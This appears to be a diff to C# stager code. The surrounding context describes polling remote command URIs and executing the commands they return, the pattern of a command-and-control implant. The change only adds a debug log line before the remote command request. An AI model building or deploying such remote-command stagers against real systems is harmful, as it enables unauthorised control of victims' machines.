@@ -391,6 +391,9 @@ namespace Stager
                  * If the first URI does not return, it will move the URI to the bottom of the list and start the round over.
                  * Second, it will execute the command
                  */
+#if DEBUG
+                Console.WriteLine("[*] Requesting command from {0}", commandUriList[0]);
+#endif
                 Task<StagerCommand> cmd = RequestCommand(commandUriList[0]);
                 StagerCommand result = cmd.Result;
                 if(result.HttpStatusCode != System.Net.HttpStatusCode.OK)
